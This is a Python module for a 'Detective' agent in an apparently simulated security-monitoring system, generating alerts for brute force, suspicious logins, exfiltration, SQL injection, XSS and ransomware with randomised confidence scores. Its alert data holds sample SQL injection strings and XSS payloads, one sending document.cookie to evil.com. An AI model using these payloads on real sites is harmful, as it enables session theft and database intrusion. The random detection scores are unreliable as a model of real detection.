"""
Detective Agent — Log Intelligence
Responsibilities: analyze login attempts, detect brute force attacks,
detect abnormal login locations, SQL injection, XSS, and ransomware.
"""

from __future__ import annotations
import asyncio
import random
import uuid
from collections import defaultdict
from datetime import datetime, timedelta
from typing import Any, Dict, List, Optional

from models.schemas import (
    AgentName, SeverityLevel, AttackType, AlertStatus, LogEventType,
)
from database.repository import save_alert, save_log, save_agent_message


class DetectiveAgent:
    """
    Detective analyzes authentication logs, system events, and application
    traffic to spot brute force, injection attacks, XSS, ransomware, and more.
    """

    NAME = AgentName.DETECTIVE
    ROLE = "Log Intelligence"
    RESPONSIBILITIES = [
        "Analyze login attempts & brute force",
        "Detect SQL injection & XSS attacks",
        "Identify ransomware & malware patterns",
        "Flag abnormal login locations",
    ]

    BRUTE_FORCE_THRESHOLD = 5
    BRUTE_FORCE_WINDOW = 300  # seconds

    NORMAL_LOCATIONS = ["New York", "London", "San Francisco", "Chicago", "Seattle"]
    SUSPICIOUS_LOCATIONS = ["Unknown", "TOR Exit Node", "Moscow", "Beijing", "Pyongyang"]
    USERNAMES = ["root", "admin", "administrator", "ubuntu", "deploy", "git", "user1"]

    def __init__(self):
        self.status = "online"
        self.threat_count = 0
        self.last_action: Optional[str] = None
        self.last_action_time: Optional[datetime] = None
        self.confidence_scores: List[float] = []
        self._message_bus = None
        self._failed_attempts: Dict[str, List[datetime]] = defaultdict(list)
        self._ws_manager = None
        self.start_time = datetime.utcnow()

    def attach_bus(self, bus):
        self._message_bus = bus

    def attach_ws_manager(self, ws_manager):
        self._ws_manager = ws_manager

    # ------------------------------------------------------------------
    # Detection logic
    # ------------------------------------------------------------------

    async def analyze_failed_login(self, ip: str, username: str, auth_protocol: str = "ssh", password_list: str = "dictionary") -> Optional[Dict]:
        """Track failed logins and raise alert on brute force threshold."""
        now = datetime.utcnow()
        window_start = now - timedelta(seconds=self.BRUTE_FORCE_WINDOW)
        self._failed_attempts[ip] = [t for t in self._failed_attempts[ip] if t > window_start]
        self._failed_attempts[ip].append(now)

        await self._log_event(
            LogEventType.LOGIN_FAILED,
            f"Failed login attempt for '{username}' from {ip}",
            ip=ip, severity=SeverityLevel.LOW, user=username,
        )

        attempt_count = len(self._failed_attempts[ip])
        if attempt_count >= self.BRUTE_FORCE_THRESHOLD:
            confidence = min(0.99, 0.70 + (attempt_count * 0.02))
            severity = SeverityLevel.CRITICAL if attempt_count > 20 else SeverityLevel.HIGH

            alert = {
                "id": str(uuid.uuid4()),
                "timestamp": now.isoformat(),
                "agent": self.NAME.value,
                "event": "Brute Force Attack Detected",
                "threat_type": AttackType.BRUTE_FORCE.value,
                "severity": severity.value,
                "source_ip": ip,
                "target": username,
                "status": AlertStatus.ACTIVE.value,
                "confidence": round(confidence, 3),
                "details": {
                    "failed_attempts": attempt_count,
                    "username": username,
                    "window_seconds": self.BRUTE_FORCE_WINDOW,
                    "technique": "credential stuffing / dictionary attack",
                    "auth_protocol": auth_protocol,
                    "password_list": password_list,
                },
            }
            await save_alert(alert)
            if self._ws_manager:
                await self._ws_manager.broadcast_alert(alert)
            self._update_stats("Brute force detected", confidence)
            return alert
        return None

    async def analyze_login_location(self, ip: str, username: str, location: str, device_fingerprint: str = "unknown_device") -> Optional[Dict]:
        """Flag logins from suspicious or unusual geographic locations."""
        is_suspicious = location in self.SUSPICIOUS_LOCATIONS
        if not is_suspicious:
            await self._log_event(
                LogEventType.LOGIN_SUCCESS,
                f"Login from '{username}' at {location} — normal",
                ip=ip, severity=SeverityLevel.LOW, user=username,
            )
            return None

        confidence = random.uniform(0.70, 0.90)
        alert = {
            "id": str(uuid.uuid4()),
            "timestamp": datetime.utcnow().isoformat(),
            "agent": self.NAME.value,
            "event": "Suspicious Login Location",
            "threat_type": AttackType.SUSPICIOUS_LOGIN.value,
            "severity": SeverityLevel.MEDIUM.value,
            "source_ip": ip,
            "target": username,
            "status": AlertStatus.ACTIVE.value,
            "confidence": round(confidence, 3),
            "details": {"location": location, "username": username, "device_fingerprint": device_fingerprint},
        }
        await save_alert(alert)
        if self._ws_manager:
            await self._ws_manager.broadcast_alert(alert)
        await self._log_event(
            LogEventType.LOGIN_FAILED,
            f"Suspicious login location for '{username}': {location}",
            ip=ip, severity=SeverityLevel.MEDIUM, user=username,
        )
        self._update_stats("Suspicious location detected", confidence)
        return alert

    async def analyze_data_exfiltration(self, ip: str, bytes_transferred: int, exfil_protocol: str = None, destination_type: str = None, exfil_encryption: str = "none") -> Optional[Dict]:
        """Detect unusually large outbound data transfers."""
        threshold = 50 * 1024 * 1024
        if bytes_transferred < threshold:
            return None

        confidence = min(0.99, 0.65 + (bytes_transferred / (500 * 1024 * 1024)))
        severity = SeverityLevel.CRITICAL if bytes_transferred > 200 * 1024 * 1024 else SeverityLevel.HIGH
        mb = round(bytes_transferred / (1024 * 1024), 2)

        alert = {
            "id": str(uuid.uuid4()),
            "timestamp": datetime.utcnow().isoformat(),
            "agent": self.NAME.value,
            "event": "Data Exfiltration Suspected",
            "threat_type": AttackType.DATA_EXFILTRATION.value,
            "severity": severity.value,
            "source_ip": ip,
            "status": AlertStatus.ACTIVE.value,
            "confidence": round(confidence, 3),
            "details": {
                "bytes_transferred": bytes_transferred,
                "megabytes": mb,
                "threshold_mb": 50,
                "destination": destination_type or random.choice(["external ASN", "cloud storage", "TOR exit"]),
                "protocol": (exfil_protocol or random.choice(["HTTPS", "FTP", "DNS tunnel", "SFTP"])).upper(),
                "encryption": exfil_encryption,
            },
        }
        await save_alert(alert)
        if self._ws_manager:
            await self._ws_manager.broadcast_alert(alert)
        await self._log_event(
            LogEventType.DATA_TRANSFER,
            f"Large data transfer from {ip}: {mb} MB",
            ip=ip, severity=severity,
        )
        self._update_stats("Data exfiltration detected", confidence)
        return alert

    async def analyze_sql_injection(self, ip: str, endpoint: str = "/api/login", injection_type: str = "union", waf_evasion: str = "none", database_type: str = None) -> Optional[Dict]:
        """Detect SQL injection attempt patterns in application logs."""
        confidence = random.uniform(0.80, 0.96)
        severity = SeverityLevel.CRITICAL

        payloads = {
            "union":      ["' UNION SELECT * FROM users--", "' UNION SELECT null,table_name FROM information_schema.tables--"],
            "blind":      ["1' AND SLEEP(5)--", "' AND 1=1--", "' OR '1'='1"],
            "time_based": ["'; WAITFOR DELAY '0:0:5'--", "1; SELECT SLEEP(5)"],
        }
        used_payloads = payloads.get(injection_type, payloads["union"])

        alert = {
            "id": str(uuid.uuid4()),
            "timestamp": datetime.utcnow().isoformat(),
            "agent": self.NAME.value,
            "event": "SQL Injection Attack Detected",
            "threat_type": AttackType.SQL_INJECTION.value,
            "severity": severity.value,
            "source_ip": ip,
            "target": endpoint,
            "status": AlertStatus.ACTIVE.value,
            "confidence": round(confidence, 3),
            "details": {
                "injection_type": injection_type,
                "target_endpoint": endpoint,
                "sample_payloads": used_payloads[:2],
                "database_type": database_type or random.choice(["MySQL", "PostgreSQL", "MSSQL", "Oracle"]),
                "attempts": random.randint(10, 80),
                "waf_evasion": waf_evasion,
            },
        }
        await save_alert(alert)
        if self._ws_manager:
            await self._ws_manager.broadcast_alert(alert)
        await self._log_event(
            LogEventType.SYSTEM_EVENT,
            f"SQL injection ({injection_type}) detected from {ip} targeting {endpoint}",
            ip=ip, severity=severity,
        )
        self._update_stats("SQL injection detected", confidence)
        return alert

    async def analyze_xss_attack(self, ip: str, xss_type: str = "reflected", target_endpoint: str = "/search", payload_encoding: str = "none") -> Optional[Dict]:
        """Detect Cross-Site Scripting attack patterns."""
        confidence = random.uniform(0.75, 0.93)
        severity = SeverityLevel.HIGH if xss_type == "reflected" else SeverityLevel.CRITICAL

        payloads = {
            "reflected": ["<script>alert(document.cookie)</script>", "<img src=x onerror=alert(1)>"],
            "stored":    ["<script>fetch('https://evil.com/?c='+document.cookie)</script>", "<svg onload=alert(1)>"],
            "dom":       ["javascript:/*--></title></style></textarea></script><xss>", "#<script>"],
        }
        used_payloads = payloads.get(xss_type, payloads["reflected"])

        alert = {
            "id": str(uuid.uuid4()),
            "timestamp": datetime.utcnow().isoformat(),
            "agent": self.NAME.value,
            "event": "Cross-Site Scripting (XSS) Detected",
            "threat_type": AttackType.XSS.value,
            "severity": severity.value,
            "source_ip": ip,
            "target": target_endpoint,
            "status": AlertStatus.ACTIVE.value,
            "confidence": round(confidence, 3),
            "details": {
                "xss_type": xss_type,
                "target_endpoint": target_endpoint,
                "sample_payloads": used_payloads[:2],
                "bypass_technique": random.choice(["HTML encoding bypass", "JS obfuscation", "Event handler injection", "SVG-based"]),
                "session_hijack_risk": xss_type in ("stored", "dom"),
                "payload_encoding": payload_encoding,
            },
        }
        await save_alert(alert)
        if self._ws_manager:
            await self._ws_manager.broadcast_alert(alert)
        await self._log_event(
            LogEventType.SYSTEM_EVENT,
            f"XSS attack ({xss_type}) detected from {ip} on {target_endpoint}",
            ip=ip, severity=severity,
        )
        self._update_stats("XSS attack detected", confidence)
        return alert

    async def analyze_ransomware(self, ip: str, spread_rate: str = "medium", encryption_algo: str = None, ransom_family: str = None) -> Optional[Dict]:
        """Detect ransomware deployment and lateral spread patterns."""
        confidence = random.uniform(0.82, 0.97)
        severity = SeverityLevel.CRITICAL

        rate_map = {
            "slow":   {"hosts": random.randint(2, 5),   "encrypted_mb": random.randint(100, 500)},
            "medium": {"hosts": random.randint(5, 20),  "encrypted_mb": random.randint(500, 2000)},
            "fast":   {"hosts": random.randint(20, 100), "encrypted_mb": random.randint(2000, 10000)},
        }
        stats = rate_map.get(spread_rate, rate_map["medium"])

        alert = {
            "id": str(uuid.uuid4()),
            "timestamp": datetime.utcnow().isoformat(),
            "agent": self.NAME.value,
            "event": "Ransomware Deployment Detected",
            "threat_type": AttackType.RANSOMWARE.value,
            "severity": severity.value,
            "source_ip": ip,
            "status": AlertStatus.ACTIVE.value,
            "confidence": round(confidence, 3),
            "details": {
                "spread_rate": spread_rate,
                "hosts_infected": stats["hosts"],
                "encrypted_mb": stats["encrypted_mb"],
                "ransom_family": ransom_family or random.choice(["LockBit", "BlackCat", "Cl0p", "REvil", "Conti"]),
                "extension": random.choice([".locked", ".enc", ".crypted", ".ransom"]),
                "encryption_algorithm": encryption_algo or random.choice(["AES-256", "RSA-2048", "ChaCha20"]),
                "c2_communication": True,
                "lateral_movement": spread_rate in ("medium", "fast"),
            },
        }
        await save_alert(alert)
        if self._ws_manager:
            await self._ws_manager.broadcast_alert(alert)
        await self._log_event(
            LogEventType.SYSTEM_EVENT,
            f"Ransomware detected from {ip}: {stats['hosts']} hosts infected, {stats['encrypted_mb']} MB encrypted",
            ip=ip, severity=severity,
        )
        self._update_stats("Ransomware detected", confidence)
        return alert

    # ------------------------------------------------------------------
    # Verification query handler (called by Commander)
    # ------------------------------------------------------------------

    async def verify_ip(self, ip: str) -> Dict:
        failed = len(self._failed_attempts.get(ip, []))
        threat_level = "clean"
        confidence = 0.1

        if failed >= self.BRUTE_FORCE_THRESHOLD:
            threat_level = "brute_force"
            confidence = min(0.99, 0.70 + failed * 0.02)
        elif failed > 0:
            threat_level = "suspicious"
            confidence = 0.4 + failed * 0.05

        result = {
            "id": str(uuid.uuid4()),
            "timestamp": datetime.utcnow().isoformat(),
            "from_agent": self.NAME.value,
            "to_agent": AgentName.COMMANDER.value,
            "event": "ip_verification_result",
            "ip": ip,
            "payload": {
                "failed_logins": failed,
                "threat_level": threat_level,
                "confidence": round(confidence, 3),
            },
            "message_type": "response",
        }
        await save_agent_message(result)
        if self._message_bus:
            await self._message_bus.put(result)
        return result

    # ------------------------------------------------------------------
    # A2A communication
    # ------------------------------------------------------------------

    async def report_to_commander(self, event: str, ip: str, severity: SeverityLevel, payload: Dict = None) -> Dict:
        msg = {
            "id": str(uuid.uuid4()),
            "timestamp": datetime.utcnow().isoformat(),
            "from_agent": self.NAME.value,
            "to_agent": AgentName.COMMANDER.value,
            "event": event,
            "ip": ip,
            "severity": severity.value,
            "payload": payload or {},
            "message_type": "alert",
        }
        await save_agent_message(msg)
        if self._message_bus:
            await self._message_bus.put(msg)
        return msg

    # ------------------------------------------------------------------
    # Continuous monitoring loop
    # ------------------------------------------------------------------

    async def monitor_loop(self, interval: float = 12.0):
        while True:
            await asyncio.sleep(interval)
            await self._run_log_analysis_cycle()

    async def _run_log_analysis_cycle(self):
        self.status = "busy"
        ip = self._random_ip()
        username = random.choice(self.USERNAMES)

        roll = random.random()
        if roll < 0.20:
            alert = None
            for _ in range(random.randint(5, 12)):
                alert = await self.analyze_failed_login(ip, username)
            if alert:
                await self.report_to_commander(
                    "brute_force_detected", ip, SeverityLevel(alert["severity"]),
                    {"failed_attempts": alert["details"]["failed_attempts"]},
                )
        elif roll < 0.30:
            location = random.choice(self.SUSPICIOUS_LOCATIONS)
            alert = await self.analyze_login_location(ip, username, location)
            if alert:
                await self.report_to_commander(
                    "suspicious_login", ip, SeverityLevel(alert["severity"]),
                    {"location": location},
                )
        elif roll < 0.35:
            size = random.randint(60 * 1024 * 1024, 300 * 1024 * 1024)
            alert = await self.analyze_data_exfiltration(ip, size)
            if alert:
                await self.report_to_commander(
                    "data_exfiltration", ip, SeverityLevel(alert["severity"]),
                    {"megabytes": round(size / 1024 / 1024, 1)},
                )
        else:
            location = random.choice(self.NORMAL_LOCATIONS)
            await self.analyze_login_location(ip, username, location)

        self.status = "online"

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    async def _log_event(
        self, event_type: LogEventType, message: str,
        ip: Optional[str] = None, severity: SeverityLevel = SeverityLevel.LOW,
        user: Optional[str] = None,
    ):
        log = {
            "id": str(uuid.uuid4()),
            "timestamp": datetime.utcnow().isoformat(),
            "event_type": event_type.value,
            "agent": self.NAME.value,
            "severity": severity.value,
            "message": message,
            "source_ip": ip,
            "user": user,
        }
        await save_log(log)

    def _update_stats(self, action: str, confidence: float):
        self.threat_count += 1
        self.last_action = action
        self.last_action_time = datetime.utcnow()
        self.confidence_scores.append(confidence)
        if len(self.confidence_scores) > 100:
            self.confidence_scores.pop(0)

    def _avg_confidence(self) -> float:
        if not self.confidence_scores:
            return 0.0
        return round(sum(self.confidence_scores) / len(self.confidence_scores), 3)

    @staticmethod
    def _random_ip() -> str:
        prefixes = ["192.168.1.", "10.0.0.", "172.16.0.", "203.0.113.", "198.51.100."]
        return random.choice(prefixes) + str(random.randint(1, 254))

    def get_status(self) -> Dict[str, Any]:
        uptime = int((datetime.utcnow() - self.start_time).total_seconds())
        return {
            "name": self.NAME.value,
            "status": self.status,
            "role": self.ROLE,
            "responsibilities": self.RESPONSIBILITIES,
            "last_action": self.last_action,
            "last_action_time": self.last_action_time.isoformat() if self.last_action_time else None,
            "threat_count": self.threat_count,
            "confidence_avg": self._avg_confidence(),
            "uptime_seconds": uptime,
        }
